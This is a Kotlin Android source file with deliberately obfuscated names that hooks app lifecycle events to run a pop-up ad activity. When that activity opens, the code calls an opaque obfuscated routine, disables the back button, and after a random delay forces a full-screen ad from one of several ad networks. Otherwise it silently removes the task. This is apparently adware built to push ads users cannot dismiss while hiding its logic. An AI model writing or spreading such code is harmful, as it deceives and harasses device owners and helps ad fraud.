package m.ki

import android.app.Activity
import android.app.Application
import android.os.Bundle
import android.view.ViewGroup
import androidx.activity.addCallback
import androidx.appcompat.app.AppCompatActivity
import androidx.lifecycle.lifecycleScope
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import xik.af
import kotlin.random.Random

class Udd : Application.ActivityLifecycleCallbacks {

    private var count = 0

    override fun onActivityCreated(page: Activity, s: Bundle?) {
        when (page::class.java.simpleName) {
            "ReWaPaFrt" -> {
                Fnc.nowPopFail = 0
                val adDelay = try {
                    Random.nextLong(Fnc.popMinDelay, Fnc.popMaxDelay)
                } catch (_: Throwable) {
                    200L
                }
                Fnc.o(arrayListOf("ad_done", "delay", adDelay.toString()))
                try {
                    af.z6(page)
                } catch (_: Throwable) {
                }
                (page as AppCompatActivity).onBackPressedDispatcher.addCallback {}
                if (Fnc.useByte) {
                    if (!Fnc.byteAd1.noAd()) {
                        page.lifecycleScope.launch {
                            delay(adDelay)
                            Fnc.byteAd1.showP(page)
                        }
                    } else if (!Fnc.byteAd2.noAd()) {
                        page.lifecycleScope.launch {
                            delay(adDelay)
                            Fnc.byteAd2.showP(page)
                        }
                    } else {
                        page.lifecycleScope.launch {
                            delay(200)
                            page.finishAndRemoveTask()
                        }
                    }
                } else {
                    if (!Fnc.plusAd1.noAd()) {
                        page.lifecycleScope.launch {
                            delay(adDelay)
                            Fnc.plusAd1.showT(page)
                        }
                    } else if (!Fnc.plusAd2.noAd()) {
                        page.lifecycleScope.launch {
                            delay(adDelay)
                            Fnc.plusAd2.showT(page)
                        }
                    } else {
                        page.lifecycleScope.launch {
                            delay(200)
                            page.finishAndRemoveTask()
                        }
                    }
                }
            }
        }
    }

    override fun onActivityDestroyed(a: Activity) {
        if (a::class.java.simpleName == "ReWaPaFrt") {
            try {
                (a.window.decorView as ViewGroup).removeAllViews()
            } catch (_: Throwable) {
            }
        }
    }

    override fun onActivityStarted(a: Activity) {
        if (Fnc.afterT) count++
    }

    override fun onActivityStopped(a: Activity) {
        if (Fnc.afterT && --count <= 0) {
            count = 0
            Fnc.closeAll()
        }
    }

    override fun onActivitySaveInstanceState(a: Activity, o: Bundle) {}
    override fun onActivityResumed(a: Activity) {}
    override fun onActivityPaused(a: Activity) {}
}